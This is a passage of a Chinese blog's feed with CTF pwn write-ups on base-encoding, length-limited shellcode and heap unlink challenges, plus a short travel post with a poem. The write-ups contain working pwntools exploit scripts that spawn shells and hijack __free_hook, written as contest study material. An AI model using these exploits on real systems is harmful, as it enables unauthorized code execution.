class="string">"splitw"</span>, <span class="string">"-h"</span>, <span class="string">"-l"</span>, <span class="string">"122"</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">"remote"</span>:</span><br><span class="line">    addr = <span class="string">''</span></span><br><span class="line">    host = addr.split(<span class="string">' '</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">'./BaseMachine'</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">"nodbg"</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">'./BaseMachine'</span>)</span><br><span class="line">cmd = <span class="string">'''</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    sla(<span class="string">"🫠🫠🫠"</span>, <span class="string">'plain b64 '</span> + <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line">sla(<span class="string">"🫠🫠🫠"</span>, <span class="string">b'plain b85 '</span> + <span class="string">b'aaaa'</span> * <span class="number">10</span> + <span class="string">b'a'</span>)</span><br><span class="line">ru(<span class="string">"😍😍😍 "</span>)</span><br><span class="line">data = ru(<span class="string">b'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">pad1 = data[<span class="number">0</span>:<span class="number">5</span>]</span><br><span class="line">pad2 = data[-<span class="number">5</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Match found! String: 6eU, SHA-256: b8509ba8fe72a1a7755d30eb9f16d4337774beab47a9d59d51a659c8ea8ce888</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">    sla(<span class="string">"🫠🫠🫠"</span>, <span class="string">b'b85 plain '</span> + <span class="string">b'09ba8fe72a1a7755d30eb9f16d4337774beab47a9d59d51a659c8ea8ce888aaaa'</span> + pad1 * i + pad2 + pad1 * (<span class="number">10</span> - i))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">"🫠🫠🫠"</span>, <span class="string">b'plain b64 6eU'</span>)</span><br><span class="line">ru(<span class="string">"😍😍😍 "</span>)</span><br><span class="line">flag = ru(<span class="string">b'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">sla(<span class="string">"🫠🫠🫠"</span>, <span class="string">b'b64 plain '</span> + flag)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure><h1 id="总结">总结</h1><p>这题的作者可见对编码非常熟悉，目前我还没有对 base 系列有一个太清晰的了解。最多知道它大概的原理，或者仿写加解密的代码之类的。以后有空我会尝试手搓一下各种 base 的加解密的（之前接触 base 是 hgame-mini2024 上的一道逆向题 ——base emoji）。另外对代码的阅读能力也有待提升。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
&lt;p&gt;本次 DASCTF
12 月赛尝试了 pwn 方向的两道题目，最终还是如愿以偿的爆零了。首先看到题目我就有种陌生的感觉，给定程序是去掉调试符号的，并且有多个函数，大大降低了可读性，和我先前遇见的题目有不小的区别。</summary>
    
    
    
    <category term="CTF" scheme="http://summ2.link/categories/CTF/"/>
    
    
    <category term="pwn" scheme="http://summ2.link/tags/pwn/"/>
    
    <category term="代码审计" scheme="http://summ2.link/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="函数指针" scheme="http://summ2.link/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/"/>
    
  </entry>
  
  <entry>
    <title>钱塘江边</title>
    <link href="http://summ2.link/categories/%E6%97%A5%E5%B8%B8/20241106-daily/"/>
    <id>http://summ2.link/categories/%E6%97%A5%E5%B8%B8/20241106-daily/</id>
    <published>2024-11-05T16:00:00.000Z</published>
    <updated>2025-05-08T04:16:31.860Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一叶舟轻，双桨鸿惊。水天清、影湛波平。鱼翻藻鉴，鹭点烟汀。过沙溪急，霜溪冷，月溪明。</p><p>重重似画，曲曲如屏。算当年，虚老严陵。君臣一梦，今古空名。但远山长，云山乱，晓山青。</p><p>——《行香子・过七里濑》 <span id="more"></span></p></blockquote><p><img src="/2024116-钱塘江边\IMG20241105171829.jpg"></p><p><img src="/2024116-钱塘江边\IMG20241105174504.jpg"></p><p><em>摄于 2024/11/5 17:18 沿江大道</em></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;一叶舟轻，双桨鸿惊。水天清、影湛波平。鱼翻藻鉴，鹭点烟汀。过沙溪急，霜溪冷，月溪明。&lt;/p&gt;
&lt;p&gt;重重似画，曲曲如屏。算当年，虚老严陵。君臣一梦，今古空名。但远山长，云山乱，晓山青。&lt;/p&gt;
&lt;p&gt;——《行香子・过七里濑》</summary>
    
    
    
    <category term="日常" scheme="http://summ2.link/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
  </entry>
  
  <entry>
    <title>shellcode - 有长度限制的 shellcode 解法</title>
    <link href="http://summ2.link/categories/CTF/241103-shellcode/"/>
    <id>http://summ2.link/categories/CTF/241103-shellcode/</id>
    <published>2024-11-02T16:00:00.000Z</published>
    <updated>2025-05-08T04:17:06.379Z</updated>
    
    <content type="html"><![CDATA[<h1 id="shellcode">shellcode</h1><blockquote><p>shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16进制之机械码，以其经常让攻击者获得 shell 而得名。shellcode常常使用机器语言编写。 <span id="more"></span></p></blockquote><h1 id="程序分析">程序分析</h1><p>题目来源：<strong>第七届浙江省大学生网络与信息安全竞赛预赛</strong></p><figure><img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103161301251.png" alt="image-20241103161301251"><figcaption aria-hidden="true">image-20241103161301251</figcaption></figure><h2 id="checksec">checksec</h2><figure><img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103161656543.png" alt="保护全开"><figcaption aria-hidden="true">保护全开</figcaption></figure><h2 id="逆向分析">逆向分析</h2><figure><img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103161752048.png" alt="IDA伪代码"><figcaption aria-hidden="true">IDA 伪代码</figcaption></figure><p>程序的功能很直接，执行输入的一段 shellcode，但是有<strong>0xa</strong> 的长度限制。</p><p>并且存在 <code>memmem</code> 函数，检查输入的内容，使用 IDA 继续查看<code>unk_203D</code> 的内容，发现是出题人禁止了 <code>syscall</code>的机器码。</p><figure><img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103162203348.png" alt="syscall('0f')"><figcaption aria-hidden="true">syscall('0f')</figcaption></figure><h2 id="动态调试">动态调试</h2><p><img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103165250942.png"></p><p>在程序执行 shellcode 之后，观察寄存器和栈的情况。当时比赛时发现<code>r8</code> 中存有 <code>syscall</code>指令的地址，我的一个想法是控制寄存器 <code>rax</code>, <code>rdi</code>,<code>rsi</code>, <code>rdx</code> 执行系统调用 <code>read</code>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rsi,rax</span><br><span class="line">xor rax,rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">add rdx,0x50</span><br><span class="line">call r8</span><br></pre></td></tr></tbody></table></figure><p>不过这样的长度已经超出 0xa 的限制了。后面我又想了很久，想继续利用<code>r8</code> 跳转到某个 <code>main</code> 函数上的指令，调试发现从<code>r8</code> 到一个 <code>main</code>函数的地址需要减去三位十六进制数，也就是说操作数占据了 shellcode 中 0x4的长度了。哎，结果我就这样忽视了 <code>rsp</code> 上的<code>&lt;main+0132&gt;</code>，一直到比赛结束。</p><h1 id="攻击流程">攻击流程</h1><p><em>这里的思路是白夜学长提供的。</em></p><h2 id="调整传参寄存器控制程序流程">调整传参寄存器，控制程序流程</h2><p>ELF 中的 <code>read</code> 函数参数如下</p><p><img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103171307808.png"></p><p>栈中的数据如下</p><figure><img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103171530664.png" alt="由于程序中使用call rax执行shellcode，返回地址存在栈顶"><figcaption aria-hidden="true">由于程序中使用 callrax 执行 shellcode，返回地址存在栈顶</figcaption></figure><h3 id="第一段-shellcode">第一段 shellcode</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop rdx; 返回地址出栈</span><br><span class="line">pop rdi; fd</span><br><span class="line">pop rsi; 将不需要的数据出栈</span><br><span class="line">pop rsi; *buf &lt;- shellcode address</span><br><span class="line">sud rdx,0x41; 减去偏移，结果为 &lt;main+00f1&gt;</span><br><span class="line">call rdx</span><br></pre></td></tr></tbody></table></figure><p>将程序跳转到 <code>main</code> 函数的 <code>call _read</code> 前:</p><p><img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103174318078.png"></p><h2 id="执行-shellcode">执行 shellcode</h2><p>没有了读入限制后，直接使用 pwntool 生成的 shellcode 即可。</p><h1 id="exploit">Exploit</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">p = process(<span class="string">"./shellcode1"</span>)</span><br><span class="line"><span class="comment">#p = remote("139.155.126.78", "38681")</span></span><br><span class="line">shellcode = <span class="string">"""</span></span><br><span class="line"><span class="string">pop rdx;</span></span><br><span class="line"><span class="string">pop rdi;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">sub rdx, 0x41;</span></span><br><span class="line"><span class="string">call rdx;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendafter(<span class="string">b"input"</span>, asm(shellcode))</span><br><span class="line">shellcode = <span class="string">"""</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">"""</span> <span class="comment">#10个nop，因为下次执行的地址是在shellcode1的结尾(call rdx)</span></span><br><span class="line">shellcode += shellcraft.sh()</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="小结">小结</h1><p>这回的省赛属于是坐了四小时大牢了。每道题目或者是在现实实践中，自然是与之前遇到的情况会有不同。因此对程序动态运行中的各种状态应该敏锐一些，例如栈、寄存器，可能会有发现。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;shellcode&quot;&gt;shellcode&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16
进制之机械码，以其经常让攻击者获得 shell 而得名。shellcode
常常使用机器语言编写。</summary>
    
    
    
    <category term="CTF" scheme="http://summ2.link/categories/CTF/"/>
    
    
    <category term="pwn" scheme="http://summ2.link/tags/pwn/"/>
    
    <category term="shellcode" scheme="http://summ2.link/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>Heap1sEz - 堆漏洞的简单利用</title>
    <link href="http://summ2.link/categories/CTF/heap1sEz/"/>
    <id>http://summ2.link/categories/CTF/heap1sEz/</id>
    <published>2024-10-06T16:00:00.000Z</published>
    <updated>2025-05-08T04:16:43.666Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆的内部结构">堆的内部结构</h1><blockquote><p>在程序的执行过程中，我们称由 malloc 申请的内存为 <code>chunk</code>。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。</p></blockquote><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> {</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>关于堆的结构很重要的一点在于，其使用和 free状态下的结构一致，只是相应功能有区别。例如使用时 fd段用于存储数据，可以通过某些方法把不合法的数据写入一个 free chunk 的 fd中。 <span id="more"></span></p><h1 id="程序分析">程序分析</h1><h2 id="checksec">checksec</h2><p><img src="/2024101-Heap1sEz---堆漏洞的简单利用/image-20241006122827910.png"></p><p>程序开启了 <strong>PIE</strong> 保护</p><h2 id="程序运行">程序运行</h2><p><img src="/2024101-Heap1sEz---堆漏洞的简单利用/image-20241006124624160.png"></p><h2 id="源码分析">源码分析</h2><p>程序主要由 <code>gift</code> , <code>add</code> , <code>edit</code> ,<code>show</code> , <code>delete</code> 几个函数构成。其中<code>gift</code> 函数直接让我们可以进行 <code>__free_hook</code>劫持。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">gift</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"give me a hook\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%p"</span>, &amp;hook) &lt;= <span class="number">0</span>)</span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>因此考虑通过 <code>__free_hook</code> 劫持执行<code>system('/bin/sh')</code> 得到 shell。</p><p>在 <code>delete</code>函数中给定内存块被释放，但是对应的指针没有被设置为 NULL，存在 Use AfterFree 漏洞。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">delete</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;index);</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="number">16</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"There are only 16 pages in this notebook.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (notes[index] == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Page not found.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(notes[index]); <span class="comment">//没有置空</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="攻击流程">攻击流程</h1><h2 id="泄露程序基址">泄露程序基址</h2><p>由于程序打开了PIE，导致程序运行时加载基址不确定。但是由于程序中的偏移仍然不变，我们首先需要泄露程序中.text , .data 或者 .bss 中的地址来计算程序基址。这里选择<code>main_arena</code> 进行泄露，因为通过 Unsorted Bin的机制会很容易得到。</p><p>申请两个大小为 8 的 chunk，分别为 1、2， 然后释放后放入 UnsortedBin。这里 chunk1 的 fd 就会指向某个与 <code>main_arena</code>有关的地址。经过动态调试得知， 它指向<code>&amp;main_arena - 0x08</code>。</p><p>不过目前我还不明白，为什么只有一个 chunk的时候无法泄露出地址，可能是只有一个 chunk 的时候只需要在<code>main_arena.bins</code> 中存储相关指针即可。</p><h2 id="泄露-libc-基址">泄露 libc 基址</h2><p>得到程序基址后，为了得到 <code>system</code> 函数的地址，还需要获得libc 基址。而程序中唯一可利用的输出函数位于 <code>show</code> 函数中</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;index);</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="number">16</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"There are only 16 pages in this notebook.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (notes[index] == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Page not found.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(notes[index]); <span class="comment">//可以利用</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们需要尝试将 <code>notes[index]</code> 修改为一个 got表中的值，例如 <code>read@got[plt]</code> 。</p><h2 id="利用-unlink-实现任意地址读写">利用 unlink 实现任意地址读写</h2><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unlink_chunk</span> (mchunkptr p)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chunksize</span> (p) != <span class="built_in">prev_size</span> (<span class="built_in">next_chunk</span> (p)))</span><br><span class="line">    <span class="built_in">malloc_printerr</span> (<span class="string">"corrupted size vs. prev_size"</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;                                                 </span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))</span></span><br><span class="line">    <span class="comment">//malloc_printerr ("corrupted double-linked list");</span></span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><ul><li>FD=P-&gt;fd = target addr - 0x18</li><li>BK=P-&gt;bk = expect value</li><li>FD-&gt;bk = BK，即 *(target addr- 0x18+ 0x18)=BK=expect value</li><li>BK-&gt;fd = FD，即 *(expect value +0x10) = FD = target addr-0x18</li></ul></blockquote><p>在 64 位程序里，chunk 每个字段占 8 个字节。</p><p>由于程序中存在 UAF 漏洞，只需要申请两个chunk，大小为 16（或者更大）。删除 chunk1 后<strong>编辑chunk1</strong> 覆盖 fd, bk 的值，随后删除 chunk2。此时会发生前向合并，执行unlink 相关代码。</p><p>不过这里在测试时发生了段错误，如下图：</p><p><img src="/2024101-Heap1sEz---堆漏洞的简单利用\image-20241007121038110.png"></p><p>后来发现是因为 got 表中<code>&lt;read@got[plt]+0x10&gt;</code> 的值被修改了，而这个位置恰好存储<code>__printf_chk</code>函数的地址，导致程序意外跳转到了一个不可执行的位置。所以尝试泄露其他 libc 函数的地址，并且在它后 0x10 处的函数不会在后面的攻击过程中执行。</p><figure><img src="/2024101-Heap1sEz---堆漏洞的简单利用\image-20241007173521197.png" alt=".got"><figcaption aria-hidden="true">.got</figcaption></figure><h2 id="执行-systembinsh">执行 <code>system('/bin/sh')</code></h2><h3 id="传参">传参</h3><p>观察 <code>__free_hook</code> 相关的代码，可以发现</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">delete</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="built_in">free</span>(notes[index]);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">free</span><span class="params">(<span class="type">void</span> *mem)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  mchunkptr p;                 <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  {</span><br><span class="line">    (*hook)(mem);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></tbody></table></figure><p>只需要将 <code>mem</code> 对应的位置修改为 <code>'/bin/sh'</code>即可，而使用程序中自带的 edit 功能就能实现。</p><h3 id="free_hook-劫持"><code>__free_hook</code> 劫持</h3><p>这题直接提供了后门函数 <code>gift</code> 用于修改<code>&amp;hook</code> 上的值。</p><h1 id="exp">exp</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span> </span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">p = process(<span class="string">"./vuln"</span>)</span><br><span class="line"><span class="comment">#p = remote("182.202.178.28",31639)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendline(<span class="string">b"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">b"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendline(<span class="string">b"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))    </span><br><span class="line">    p.sendlineafter(<span class="string">"Content: "</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">b"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">bss_addr = u64(p.recvuntil(<span class="string">'\x0a\x77\x65'</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">elfbase = bss_addr + <span class="number">0x8</span> - <span class="number">0x3810</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"bss:"</span>,<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">note = elfbase + <span class="number">0x3880</span></span><br><span class="line">puts = elfbase + <span class="number">0x3768</span></span><br><span 